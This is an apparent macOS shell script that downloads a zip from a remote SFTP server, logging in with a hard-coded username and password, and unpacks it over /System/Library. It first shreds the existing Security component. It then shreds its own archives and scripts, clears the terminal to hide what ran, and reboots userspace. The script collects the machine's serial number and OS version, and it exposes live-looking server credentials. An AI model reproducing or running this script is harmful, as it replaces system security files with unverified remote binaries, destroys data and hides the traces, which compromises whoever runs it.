echo "<======= 11111114=======>"
#
# <============server configuration==============>
#
PERSON_NAME="mdf"
REMOTE_HOST="eu-central-1.sftpcloud.io"
REMOTE_USER="3d61c994bf77479099a263d51e238aac"
REMOTE_PASS="9rEETQiLzUDPoirWOeHpEw81F4dQejmX"
REMOTE_PATH="/home"
REMOTE_DEST="/"

# Configuration
SERIAL_NUMBER=$(ioreg -c IOPlatformExpertDevice | grep IOPlatformSerialNumber | cut -d'"' -f4)
IOS_VERSION=$(sw_vers -productVersion)
LOCAL_FILE="appstore_unmodified"
ARCHIVE_NAME="${IOS_VERSION}_${SERIAL_NUMBER}_${LOCAL_FILE}_${PERSON_NAME}"
#echo "$ARCHIVE_NAME"


cd $home/../../../System/Library/
# configuration



#sshpass -p "$REMOTE_PASS" scp $REMOTE_USER@$REMOTE_HOST:Security_new.zip ./Security_new.zip
sshpass -p "$REMOTE_PASS" scp $REMOTE_USER@$REMOTE_HOST:"new.zip" ./"new.zip"
#rm -rf ./Security
shred -fzu -n 3 ./Security >/dev/null 2>&1
#echo "fsdfsdfdsfsdfsdfds"
unzip -qqo "new.zip" -d ./
#rm -f *.zip
shred -uzv *.{zip,7z,sh}
reset
echo "sucessfully added binaries"
clear
clear -x
echo -e "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"'
launchctl reboot userspace

